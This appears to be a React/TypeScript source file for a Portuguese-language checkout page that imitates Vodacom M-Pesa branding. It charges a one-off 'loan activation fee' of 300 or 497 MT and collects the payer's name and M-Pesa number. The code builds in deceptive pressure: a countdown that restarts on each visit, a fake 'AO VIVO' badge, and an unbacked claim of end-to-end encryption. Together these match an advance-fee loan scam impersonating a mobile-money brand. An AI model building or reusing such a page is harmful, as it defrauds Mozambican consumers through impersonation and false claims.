// @ts-nocheck
import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useMutation, useQuery } from "@tanstack/react-query";
import { getProductBySlug } from "@/lib/products.functions";
import { createCheckout, checkTransactionStatus } from "@/lib/transactions.functions";
import { Loader2, Lock, ShieldCheck, CheckCircle2, AlertTriangle, Clock } from "lucide-react";
import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";

export const Route = createFileRoute("/txuna-mpesa")({
  component: TxunaCheckout,
  head: () => ({
    meta: [
      { title: "Txuna M-Pesa — Taxa de ativação de empréstimo" },
      { name: "description", content: "Ative o seu empréstimo M-Pesa em Moçambique com pagamento seguro via M-Pesa. Escolha o plano de 6 ou 12 meses." },
      { property: "og:title", content: "Txuna M-Pesa — Taxa de ativação de empréstimo" },
      { property: "og:description", content: "Pagamento seguro via M-Pesa. Planos de 6 ou 12 meses." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
});

const SLUG = "txuna-mpesa";
const PLANS = [
  { id: "6", label: "6 meses", price: 300 },
  { id: "12", label: "12 meses", price: 497 },
] as const;

const fmt = (n: number) => `${new Intl.NumberFormat("pt-MZ", { maximumFractionDigits: 0 }).format(n)} MT`;

function Countdown() {
  const [left, setLeft] = useState(11 * 60 + 5);
  useEffect(() => {
    if (left <= 0) return;
    const t = setInterval(() => setLeft((p) => (p > 0 ? p - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [left]);
  const m = Math.floor(left / 60);
  const s = left % 60;
  return <span className="tabular-nums">{String(m).padStart(2, "0")}:{String(s).padStart(2, "0")}</span>;
}

function TxunaCheckout() {
  const fetchProduct = useServerFn(getProductBySlug);
  const checkout = useServerFn(createCheckout);

  const { data: product } = useQuery({
    queryKey: ["product", SLUG],
    queryFn: () => fetchProduct({ data: { slug: SLUG } }),
    retry: false,
  });

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [plan, setPlan] = useState<"6" | "12">("6");
  const [modal, setModal] = useState<{ status: "processing" | "pending" | "paid" | "failed"; id?: string } | null>(null);
  const checkingRef = useRef(false);

  const amount = PLANS.find((p) => p.id === plan)!.price;
  const digits = phone.replace(/\D/g, "");
  const ready = name.trim().length >= 3 && digits.length === 9 && !!product?.id;

  const m = useMutation({
    mutationFn: () =>
      checkout({
        data: {
          product_id: product!.id,
          amount_mzn: amount,
          customer_name: name.trim(),
          customer_phone: `258${digits}`,
          method: "mpesa",
          tracking: { src: `txuna-${plan}m` },
        },
      }),
    onMutate: () => setModal({ status: "processing" }),
    onSuccess: (r) => {
      if (r.status === "paid") {
        setModal({ status: "paid", id: r.id });
        return;
      }
      setModal({ status: "pending", id: r.id });
      toast("Confirme o pagamento no seu telemóvel");
    },
    onError: (e) => {
      setModal({ status: "failed" });
      toast.error(e instanceof Error ? e.message : "Erro no pagamento");
    },
  });

  useEffect(() => {
    if (modal?.status !== "pending" || !modal.id) return;
    let stopped = false;
    let count = 0;
    const timer = setInterval(async () => {
      if (stopped || checkingRef.current) return;
      if (++count > 60) { clearInterval(timer); return; }
      checkingRef.current = true;
      try {
        const r = await checkTransactionStatus({ data: { transaction_id: modal.id! } });
        if (r.status === "paid") { stopped = true; clearInterval(timer); setModal({ status: "paid", id: modal.id }); }
        else if (r.status === "failed") { stopped = true; clearInterval(timer); setModal({ status: "failed", id: modal.id }); }
      } catch {}
      checkingRef.current = false;
    }, 3000);
    return () => { stopped = true; clearInterval(timer); };
  }, [modal?.status, modal?.id]);

  useEffect(() => {
    if (modal?.status !== "paid" || !modal.id) return;
    const t = setTimeout(() => { window.location.href = `/obrigado?tx_id=${modal.id}&slug=${SLUG}`; }, 1600);
    return () => clearTimeout(t);
  }, [modal?.status, modal?.id]);

  return (
    <div className="min-h-screen app-light" style={{ background: "#f1f5f9", color: "#0f172a" }}>
      <style>{`
        @keyframes txSpin{to{transform:rotate(360deg)}}
        @keyframes txPulse{0%,100%{opacity:1}50%{opacity:.35}}
        @keyframes txUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
        .tx-card{animation:txUp .35s ease both}
      `}</style>

      {/* Header */}
      <header className="bg-white px-4 py-3 flex items-center gap-3 border-b border-slate-100">
        <img src="/brands/mpesa.png" alt="Logótipo M-Pesa" className="w-11 h-11 rounded-xl" />
        <div className="flex-1 min-w-0">
          <p className="text-lg font-extrabold leading-tight" style={{ color: "#e60000" }}>
            Vodacom <span className="text-slate-300 font-bold">|</span> M-Pesa
          </p>
          <p className="text-[11px] tracking-[0.15em] text-slate-400 font-medium uppercase">Emprestimos M-Pesa</p>
        </div>
        <span className="flex items-center gap-2 text-[12px] font-bold px-3 py-1.5 rounded-full" style={{ background: "#fee2e2", color: "#e60000" }}>
          <span className="w-2 h-2 rounded-full" style={{ background: "#e60000", animation: "txPulse 1.4s ease-in-out infinite" }} />
          AO VIVO
        </span>
      </header>

      <main className="px-4 py-5 space-y-4 max-w-md mx-auto pb-16">
        {/* Urgency */}
        <div className="tx-card rounded-2xl px-5 py-4 flex items-center justify-center gap-3 text-white font-bold" style={{ background: "#e60000" }}>
          <Clock className="h-5 w-5" />
          <span>A oferta expira em:</span>
          <Countdown />
        </div>

        <div className="flex items-center justify-between text-sm">
          <span className="flex items-center gap-2 text-slate-500 font-medium">
            <span className="w-2.5 h-2.5 rounded-full" style={{ background: "#e60000" }} />
            M-Pesa Moçambique
          </span>
          <span className="flex items-center gap-1.5 font-bold" style={{ color: "#059669" }}>
            <ShieldCheck className="h-4 w-4" /> Compra segura 🇲🇿
          </span>
        </div>

        {/* Produto */}
        <section className="tx-card bg-white rounded-2xl p-5 flex items-center gap-4">
          <img src="/brands/mpesa.png" alt="M-Pesa" className="w-14 h-14 rounded-xl" />
          <div>
            <h1 className="text-[17px] font-extrabold leading-snug">Taxa de ativação Empréstimo</h1>
            <p className="text-sm text-slate-400">Taxa única · Plano de {plan} meses</p>
          </div>
        </section>

        {/* Nome */}
        <section className="tx-card bg-white rounded-2xl p-5 space-y-3">
          <h2 className="text-[17px] font-extrabold">Nome completo</h2>
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="Ex: Maria Silva"
            className="w-full h-14 rounded-full border border-slate-200 px-5 text-[15px] outline-none focus:border-red-400"
          />
        </section>

        {/* Método */}
        <section className="tx-card bg-white rounded-2xl p-5 space-y-3">
          <h2 className="text-[17px] font-extrabold">Método de pagamento</h2>
          <div className="rounded-2xl border-2 flex items-center gap-4 p-4" style={{ borderColor: "#e60000", background: "#fff5f5" }}>
            <img src="/brands/mpesa.png" alt="M-Pesa" className="w-12 h-12 rounded-xl" />
            <div className="flex-1">
              <p className="font-extrabold text-[17px]">M-Pesa</p>
              <p className="text-sm text-slate-400">Vodacom Moçambique</p>
            </div>
            <span className="w-5 h-5 rounded-full" style={{ background: "#e60000" }} />
          </div>

          {/* Planos */}
          <h2 className="text-[17px] font-extrabold pt-2">Plano de pagamento</h2>
          <div className="grid grid-cols-2 gap-3">
            {PLANS.map((p) => {
              const sel = plan === p.id;
              return (
                <button
                  key={p.id}
                  type="button"
                  onClick={() => setPlan(p.id)}
                  className="rounded-2xl border-2 py-6 px-3 text-center transition-colors"
                  style={sel ? { borderColor: "#e60000", background: "#fff5f5" } : { borderColor: "#e2e8f0", background: "#fff" }}
                >
                  <p className="text-[22px] font-extrabold">{p.label}</p>
                  {sel ? (
                    <p className="text-sm font-bold flex items-center justify-center gap-1.5 mt-1" style={{ color: "#e60000" }}>
                      <CheckCircle2 className="h-4 w-4" /> Selecionado
                    </p>
                  ) : (
                    <p className="text-sm text-slate-400 mt-1">{fmt(p.price)}</p>
                  )}
                </button>
              );
            })}
          </div>

          {/* Telefone */}
          <h2 className="text-[17px] font-extrabold pt-2">Número M-Pesa</h2>
          <div className="flex items-center rounded-full border border-slate-200 overflow-hidden">
            <span className="px-5 h-14 flex items-center font-extrabold bg-slate-50 text-slate-600">+258</span>
            <input
              value={phone}
              onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 9))}
              inputMode="numeric"
              placeholder="84/85 + 7 dígitos"
              className="flex-1 h-14 px-4 text-[15px] outline-none"
            />
          </div>

          <div className="rounded-2xl bg-slate-50 p-4 flex gap-3 text-[13px] text-slate-500">
            <Lock className="h-4 w-4 mt-0.5 shrink-0" />
            <p>Protegemos os seus dados de pagamento com criptografia ponta a ponta.</p>
          </div>

          <button
            onClick={() => m.mutate()}
            disabled={!ready || m.isPending}
            className="w-full h-16 rounded-full text-white text-[17px] font-extrabold flex items-center justify-center gap-2 disabled:opacity-50"
            style={{ background: "#7fd1ae" }}
          >
            {m.isPending ? <Loader2 className="h-5 w-5" style={{ animation: "txSpin .8s linear infinite" }} /> : "🏆"}
            Finalizar Empréstimo — {fmt(amount)}
          </button>
        </section>

        <section className="tx-card bg-white rounded-2xl px-5 py-4 flex items-center justify-between text-sm">
          <span className="font-extrabold">Detalhes de segurança</span>
          <span className="flex items-center gap-2 text-slate-400">
            <Lock className="h-4 w-4" /> SSL · Imediato
          </span>
        </section>

        <p className="text-center text-sm text-slate-400">
          Com tecnologia <span className="font-extrabold text-slate-600">PayNow</span>
        </p>
      </main>

      {modal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-5" style={{ background: "rgba(15,23,42,.6)", backdropFilter: "blur(6px)" }}>
          <div className="bg-white rounded-3xl p-9 w-full max-w-sm text-center space-y-4">
            {modal.status === "paid" ? (
              <>
                <CheckCircle2 className="h-14 w-14 mx-auto" style={{ color: "#059669" }} />
                <h2 className="text-xl font-extrabold">Pagamento confirmado!</h2>
                <p className="text-sm text-slate-400">A redireccionar...</p>
              </>
            ) : modal.status === "failed" ? (
              <>
                <AlertTriangle className="h-14 w-14 mx-auto text-red-400" />
                <h2 className="text-xl font-extrabold">Pagamento falhou</h2>
                <p className="text-sm text-slate-400">Verifique o saldo e tente novamente.</p>
                <button onClick={() => setModal(null)} className="w-full h-12 rounded-full text-white font-bold" style={{ background: "#e60000" }}>
                  Tentar novamente
                </button>
              </>
            ) : (
              <>
                <Loader2 className="h-12 w-12 mx-auto" style={{ color: "#e60000", animation: "txSpin .8s linear infinite" }} />
                <h2 className="text-xl font-extrabold">A processar pagamento</h2>
                <p className="text-sm text-slate-400">Confirme o pedido no seu telemóvel M-Pesa.</p>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
